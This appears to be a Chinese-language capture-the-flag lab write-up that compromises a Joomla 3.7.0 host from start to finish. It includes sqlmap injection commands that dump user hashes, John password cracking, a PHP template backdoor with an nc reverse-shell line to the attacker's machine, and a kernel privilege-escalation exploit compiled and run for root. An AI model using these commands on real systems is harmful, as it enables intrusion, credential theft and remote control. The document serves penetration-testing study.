# 信息收集

nmap扫描

![img](assets/1684645252939-8635728e-3595-4c44-8e02-4dd199803ecc.png)发现目标ip,192.168.1.139

进一步收集端口、服务等信息

nmap -sV -p- 192.168.1.138

![img](assets/1684645412045-85c78109-0e65-4f0f-9a0d-d92a7ffdbeb0.png)

nmap初步漏洞扫描，发现joomla版本3.7.0，以及可能存在SQL注入漏洞

![img](assets/1684646323735-a49c5a94-1138-4cfb-93de-c3b449fefc47.png)

开放80端口，apacheweb服务，访问一下看看

![img](assets/1684645524643-526d0ce2-cb48-4eba-a63f-a47abc8d6b63.png)说明情况，仅有一个flag,同时使用whatweb或者火狐插件，识别网站信息：

![img](assets/1684645655138-8dcac71a-83a9-4e1f-ba7f-87032dbffd8d.png)joomlaCMS搭建，到这里，针对该cms进行利用（Joomscan）

joomscan -u 192.168.1.139

![img](assets/1684646750149-4d8b033c-606e-49ad-a401-210ff46ad7f2.png)adminurl打开是个后台登陆界面

![img](assets/1684646818326-b79d5bbe-ae07-40ab-84be-307e2eb77f30.png)

# web攻击

针对目前收集到的信息，joomla 3.7.0,百度，google搜索相关攻击方式

![img](assets/1684646962457-239883f0-c381-4e87-a4ad-44427b2b6b2a.png)

跟着进行攻击利用即可,msf中也有相关利用脚本，但是攻击没有成功

## 使用 searchsploit工具

[searchsploit用法 - 流亡青年 - 博客园](https://www.cnblogs.com/liuwangqingnian/p/15180838.html)

 使用前先更新一下数据库,再搜索

```bash
 searchsploit --update  
 searchsploit joomla 3.7.0
 searchsploit -p 42033.txt
```

![img](assets/1684647159129-86924625-8377-4720-ac50-80c344af8934.png)发现有一个SQL注入的漏洞可以利用

查找该利用方式的存储位置

searchsploit -p 42033.txt

![img](assets/1684647316107-1cfbb7d9-db07-4508-94ba-4d62a0cc76f9.png)

复制一份过来，详细看看

![img](assets/1684647421388-478b1ba4-9c47-4211-85fe-ef1e848ffc77.png)

用sqlmap进行注入攻击即可

```bash
sqlmap -u "http://192.168.1.139/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

![img](assets/1684647581439-519d2041-438c-4471-a13f-6ce7a21da67c.png)

注入可以成功，那就进一步拿我们想要的信息即可

```bash
sqlmap -u "http://192.168.1.139/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D  joomladb --tables  -p list[fullordering] --batch
sqlmap -u "http://192.168.1.139/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D  joomladb -T "#__users"  --columns  -p list[fullordering]
sqlmap -u "http://192.168.1.139/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D  joomladb -T "#__users"  -C  name,username,password --dump  -p list[fullordering] --batch
```

![img](assets/1684648173370-f7e6af60-7d89-4b5f-8bce-36f2aa491d0b.png)

得到admin用户以及他的密码hash

在网上没找到很明显的joomla的hash文件，因此我们准备暴力解码，使用john工具将password hash值保存成文本文件hash1.txt

![img](assets/1684648561473-3a34212b-7df7-4168-abcd-ea4e858e5be9.png)

接着输入 John hash.txt解密出来是snoopy，登陆成功

![img](assets/1684648588418-55f78c4f-6f0e-443e-87bd-2cf2ab96001c.png)

得到用户名：admin,密码：snoopy,登录网站

![img](assets/1684648670463-0f5f3837-9204-41d9-a438-a8ab545c58c9.png)

 仔细翻看，最后发现templates下存在模板，而模板里的php文件可编辑

创建一个php后门文件

![img](assets/1684649126985-dcfcd2b7-327f-4524-8da9-d99d7bc241a2.png)访问一下看看，路径不对，百度查找一下joomla模板文件位置

![img](assets/1684649249747-4a07da66-58a1-4020-b617-e17c565db7a9.png)![img](assets/1684649269197-8ec5cf48-0a3a-42aa-a54e-a4196b3fb266.png) 再根据模板模块中的信息尝试一下就可以找到  

![img](assets/1684649942088-05723eab-fe75-4786-8cf6-7b8a11283727.png)蚁剑连接

![img](assets/1684650017341-408c4604-333f-42d8-b1f5-fc70a7831d16.png)

写入反弹shell，创建文件，写入反弹shell木马

```bash
<?php 
system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.128 10086 >/tmp/f');
?>
```

![img](assets/1684650473995-7904324d-433c-4171-9eb2-577ed62edf5f.png)kali监听，这里访问木马，nc -lvvp 10086

192.168.1.139/templates/beez3/html/shell1.php

![img](assets/1684650576893-8b146e19-2373-4007-a083-be29f1148be4.png)

得到shell,构建稳定shell     python -c "import pty; pty.spawn('/bin/bash')"

# 提权

获取当前主机信息

```plain
cat /proc/version   版本
cat /etc/issue     发行版本
```



![img](assets/1684651052795-08def6a7-fff0-4765-a3e0-67cdc29f0095.png)

```plain
Linux version  4.4.0-21
Ubuntu 16.04
```

 看到当前版本是Ubuntu 16.04， 去searchsploit寻找一下漏洞  

![img](assets/1684651184137-60c06ed2-d332-4e18-ae4a-c178abbd2a04.png)

 对比搜索引擎搜索该版本漏洞，锁定path为39773.txt的漏洞。查看该文件路径  

![img](assets/1684651272895-bfca5e65-12d5-4db5-9eb2-5d113f07a695.png)![img](assets/1684651585334-608c105b-6794-45c0-8322-4184da20a418.png)

## 文件传输

这里的攻击脚本，需要传到目标机器，这里我想到的思路有两个：

蚁剑上传、目标自己下载，这里让目标自己下载即可

下载并解压：

![img](assets/1684652392952-b417b0d7-6334-4101-a1b0-97e87358ac71.png)解开了exploit.tar文件可以看到有很多的脚本，接着进行如下操作。

```plain
./compile.sh
ls
cd ebpf_mapfd_doubleput_exploit
ls  
./compile.sh
```

![img](assets/1684652446131-8aed7e2e-e747-4ddd-b324-a76b72570ab3.png)

编译成功，接着提权

```plain
./doubleput
```

等一会显示成功，此时是root权限，打开root目录，发现the-flag.txt

![img](assets/1684652474272-01a3dc70-6ae1-4937-9b37-16534c6f90ad.png)

# 总结收获

1、joomlaCMS扫描工具：joomscan

2、漏洞数据库 searchsploit

3、john哈希破解工具

4、文件传输